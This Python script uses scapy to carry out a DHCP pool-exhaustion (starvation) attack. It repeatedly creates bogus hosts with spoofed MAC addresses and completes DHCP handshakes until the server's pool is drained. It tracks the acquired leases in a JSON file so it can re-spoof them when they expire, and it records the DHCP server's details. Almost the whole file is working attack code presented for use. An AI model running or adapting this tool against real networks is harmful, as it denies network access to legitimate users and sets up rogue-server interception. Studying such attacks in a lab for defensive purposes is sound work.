# pool.exhaustion.py
# Performs a DHCP server's pool exhaustion, creating and adding acquired IP addresses to a .json file
# 1. Get the interface network parameters such as assigned IP address and netmask to obtain a list of all possible IP addresses on network
# 2. Check json file. If exists, check if bogus hosts' IP address lease time is already current. 
# 3. Decide which addresses need to be spoofed. For every one of those, perform a broadcast Request-Response handshake trying to assign that address to a bogus host
# 4. Save/update all spoofed addresses with it's corresponding bogus host's info to json file


#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
import time
import json
import threading
from datetime import datetime
from pathlib import Path
from common import *
from utils import setup_logging, write_to_log, file_semaphore


#### CONFIG #### -------------------------------------------------------------------
timeout_to_receive_dhcp_response = 10 # Time to wait until non response is decided
max_failed_attempts_to_conclude_exhaustion = 3
catch_and_release = False # Debug mode. Pool exhaustion + save results + Load results + Release + Save results

base_dir = Path(__file__).resolve().parent
log_file = base_dir / "logs" / "pool_exhaustion.log"

setup_logging(log_file)


#### FUNCTIONS #### ----------------------------------------------------------------

def is_pool_exhaustion_needed(available_hosts, network):
#def is_pool_exhaustion_needed(network):
    """
    Decide if a spoof is needed for every available IP address on the network.
    Retuns True if not all IP addresses on network are spoofed
    """

    write_to_log(f"Checking if host spoof is expired")
    try:
        spoofed_ip_dict = load_from_json(json_file, file_semaphore)
    except FileNotFoundError as e:
        write_to_log(str(e))
        spoofed_ip_dict = {}
    except json.JSONDecodeError as e:
        write_to_log(f"Error decoding JSON file: {str(e)}")
        spoofed_ip_dict = {}
    except Exception as e:
        write_to_log(f"An unexpected error occurred: {str(e)}")
        spoofed_ip_dict = {}

    # Return True if something goes wrong
    if not spoofed_ip_dict:
        write_to_log(f"Trying to spoof all available IP addresses on network")
        return True

    # Check if previous results belong to the same network
    if not ips_in_same_network(spoofed_ip_dict.keys(), network):
        # If not, flush JSON file and spoof all addresses
        try:
            save_to_json({}, json_file, file_semaphore)
        except FileNotFoundError as e:
            write_to_log(str(e))
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {str(e)}")
        except Exception as e:
            write_to_log(f"An unexpected error occurred: {str(e)}")

        # Also flush known router JSON file
        try:
            save_to_json({}, router_file, file_semaphore)
        except FileNotFoundError as e:
            write_to_log(str(e))
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {str(e)}")
        except Exception as e:
            write_to_log(f"An unexpected error occurred: {str(e)}")

        # Also flush known hosts JSON file
        try:
            save_to_json({}, hosts_file, file_semaphore)
        except FileNotFoundError as e:
            write_to_log(str(e))
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {str(e)}")
        except Exception as e:
            write_to_log(f"An unexpected error occurred: {str(e)}")

        write_to_log(f"Previous results' network changed. Trying to spoof all available IP addresses on actual network")

        return True
    
    try:
        # Remove outdated bogus host from dictionary and save changed to JSON file
        clean_host_dict = remove_expired_spoofed_hosts(spoofed_ip_dict)
        try:
            save_to_json(clean_host_dict, json_file, file_semaphore)
        except FileNotFoundError as e:
            write_to_log(str(e))
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {str(e)}")
        except Exception as e:
            write_to_log(f"An unexpected error occurred: {str(e)}")

        # Removing already spoofed addresses from all available IP addresses list 
        available_hosts[:] = [ip for ip in available_hosts if ip not in clean_host_dict]

        # If remaining addresses to spoof are router/DHCP Server and our own device
        if len(available_hosts) <= 2:
            # All possible addresses on network are spoofed. There's no need to perform a pool exhaustion
            return False

    except Exception as e:

        write_to_log(f"Error during spoof need checking: {e}")
    
    return True


def remove_expired_spoofed_hosts(host_dict):
    """
    Remove old spoofed host by comparing acquisition time with time now
    """
    time_now = datetime.now()
    addresses_with_expired_spoof = []
    # Check if spoof is out-to-date by comparing acquisition time with lease renewal time
    for ip, host in host_dict.items():

        # Comparing acquisition time to time now
        time_diff = (time_now - host.acquisition_time).total_seconds()
        if time_diff > host.lease_time or not host.is_spoofed:
        #if time_diff > host.lease_time:
            addresses_with_expired_spoof.append(ip)

    # Removing non-spoofed hosts from host_dict
    if addresses_with_expired_spoof:
        write_to_log(f"IP addresses that need re-spoofing:")
        for ip in addresses_with_expired_spoof:
            write_to_log(f"{ip}")
            del host_dict[ip]
    
    return host_dict


def pool_exhaustion_with_discover(timeout, max_failed_attempts):
    """
    Perform a complete DORA handshake.
    """
    spoofed_ips_counter = 0
    failed_attempts = 0

    while failed_attempts < max_failed_attempts:
    #for _ in range(number):
        # Create a new bogus host
        host = fake_host.create_host()

        # Perform DORA handshake to obtain an IP address
        acquisition_successfull = perform_dhcp_discover_offer(host, timeout)

        if acquisition_successfull:
            spoofed_ips_counter += 1
        else:
            failed_attempts += 1

    return spoofed_ips_counter


def perform_dhcp_discover_offer(host, timeout):
    """
    Perform a DHCP Discover-Offer transaction. 
    If a DHCP Offer is received, continues with Request-ACK
    """

    # Create new DHCP Discover packet
    dhcp_discover_packet = create_dhcp_discover_packet(host)

    # Send DHCP Discover
    scapy.sendp(dhcp_discover_packet, verbose=False, iface=iface)
    write_to_log(f"DHCP Discover sent: {host.mac_address} requesting a new IP address")

    # Waits until timeout or DHCP Response is received
    dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout)

    if dhcp_discover_response:

        # Update hosts parameters, like a new assigned IP address
        print(f"{dhcp_discover_response.summary()}")
        response_type = handle_dhcp_response(dhcp_discover_response, host)

        if response_type == "OFFER":

            write_to_log(f"DHCP Offer received: {host.mac_address} offered {host.ip_address}")

            # Getting DHCP server parameters from received DHCP Offer
            global dhcp_server_ip
            if not dhcp_server_ip:

                dhcp_opts = get_dhcp_options(dhcp_discover_response)
                #print(f"{dhcp_opts}")

                dhcp_server_instance = dhcp_server.create_server(dhcp_opts["server_id"], "ff:ff:ff:ff:ff:ff")

                dhcp_server_ip = dhcp_server_instance.ip_address

                write_to_log(f"Found DHCP server at {dhcp_server_ip}")

                dhcp_server_dict = {}
                dhcp_server_dict[dhcp_server_ip] = dhcp_server_instance.to_dict()

                # Save new dhcp server information to JSON file
                try:
                    with file_semaphore:
                        with open(router_file, 'w') as file:
                            json.dump(dhcp_server_dict, file, indent=4)
                except Exception as e:
                    write_to_log(f"Error saving JSON file: {e}")

            # Return True if ip acquisition is successful
            return perform_dhcp_request_ack(host, timeout)

        elif response_type == "ACK":

            # ACK in this stage is expected if Rapid Commit is enabled on router. 
            write_to_log(f"DHCP ACK received: {host.mac_address} successfully linked to {host.ip_address}")
            host_dict = {}
            host_dict[host.ip_address] = host
            update_json_file(host_dict, json_file, file_semaphore)
            # IP acquisition successfull
            return True

        elif response_type == "NAK":

            #print(f"NAK received")
            write_to_log(f"DHCP NAK received: Failed to obtain an IP address for that host")

        else:

            write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_discover_packet[scapy.DHCP].options[0][1]}")
            return

    else:

        # If no response is received
        write_to_log("Timeout reached without receiving a valid DHCP Discover response.")
        return
    

def perform_dhcp_request_ack(host, timeout):
    """
    Completes the DHCP handshake process after receiving a DHCP Offer
    """

    # If Discover-Offer occurs, continue with DORA handshake
    dhcp_request_packet = create_broadcast_dhcp_request_packet(host, dhcp_server_ip)
    # Send DHCP Request
    scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
    write_to_log(f"DHCP Request sent: {host.mac_address} requesting {host.ip_address}")

    # Waits until timeout or DHCP Response is received
    dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout)

    # If there's response
    if dhcp_request_response:
        
        print(f"{dhcp_request_response.summary()}")
        # Check what kind of DHCP response is
        response_type = handle_dhcp_response(dhcp_request_response, host)

        if response_type == "ACK":
            # DORA handshake completed, saving new host to json file
            write_to_log(f"DHCP ACK received: {host.mac_address} successfully linked to {host.ip_address}")
            host_dict = {}
            host_dict[host.ip_address] = host
            update_json_file(host_dict, json_file, file_semaphore)
            # IP acquisition successfull
            return True
        elif response_type == "NAK":

            write_to_log(f"DHCP NAK received: {host.mac_address} failed to acquire {host.ip_address}")
                 
        else:
            write_to_log(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_request_packet[scapy.DHCP].options[0][1]}")
            return


def release_all_ips(host_dict):
    """
    Sends a DHCP Release for every fake host with an IP address linked
    """
    write_to_log(f"Releasing all spoofed IP addresses:")
    #global spoofed_ip_dict
    for ip, host in host_dict.items():
        #if host.is_spoofed:
        write_to_log(f"Releasing IP address {ip} from {host.mac_address}")
        send_release(host.mac_address, ip, 0.1, dhcp_server_ip, dhcp_server_mac, iface)
        # Updating spoofed host's dict
        host_dict[ip].is_spoofed = False
        time.sleep(0.25)
    write_to_log(f"All IP addresses have been released!")


def ips_in_same_network(ip_list, actual_network):
    """
    Check if each IP in the list belongs to the same network as actual_ip.
    """

    # Check each IP in the list
    for ip in ip_list:
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj not in actual_network:
            return False
    
    return True


def main():

    write_to_log(f"Starting DHCP Server's pool exhaustion service")
    # Getting interface parameters
    global our_ip_address, our_mac_address, our_netmask
    our_ip_address, our_mac_address, our_netmask, our_network = get_network_params(iface)
    write_to_log(f"Interface {iface} has IPaddr: {our_ip_address}, MACaddr: {our_mac_address} and netmask: {our_netmask}")
    # Getting all host avalaible IP addresses for network
    available_hosts = get_hosts_from_network(our_ip_address, our_netmask)

    # Starting response DHCP packet capture thread
    capture_thread = threading.Thread(target=capture_dhcp_packets, args=(captured_packets, our_mac_address, iface))
    capture_thread.daemon = True
    capture_thread.start()

    # Pool exhaustion: getting all avalaible IP from DHCP server's pool
    try:
        # Check previous spoofed host in json file to decide if pool exhaustion is needed for every existing ip address on network
        if is_pool_exhaustion_needed(available_hosts, our_network):

            write_to_log(f"Starting DHCP Discover pool exhaustion")

            spoofed_ips_counter = pool_exhaustion_with_discover(timeout_to_receive_dhcp_response, max_failed_attempts_to_conclude_exhaustion)
            write_to_log(f"Pool exhaustion completed with a total of {spoofed_ips_counter} IP addresses acquired")

        else:

            write_to_log(f"All IP addresses existent on network are spoofed. There's no need to perform a pool exhaustion.")


        # If True: releases all ip addresses 
        if catch_and_release:
            time.sleep(5)

            try:
                spoofed_hosts_dict = load_from_json(json_file, file_semaphore)
            except FileNotFoundError as e:
                write_to_log(str(e))
                spoofed_hosts_dict = {}
            except json.JSONDecodeError as e:
                write_to_log(f"Error decoding JSON file: {str(e)}")
                spoofed_hosts_dict = {}
            except Exception as e:
                write_to_log(f"An unexpected error occurred: {str(e)}")
                spoofed_hosts_dict = {}

            release_all_ips(spoofed_hosts_dict)
            
            try:
                save_to_json(spoofed_hosts_dict, json_file)
            except FileNotFoundError as e:
                write_to_log(str(e))
            except json.JSONDecodeError as e:
                write_to_log(f"Error decoding JSON file: {str(e)}")
            except Exception as e:
                write_to_log(f"An unexpected error occurred: {str(e)}")
    
    except Exception as e:

        print(e) 

    finally:
        
        write_to_log(f"Service terminated")
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service manually terminated")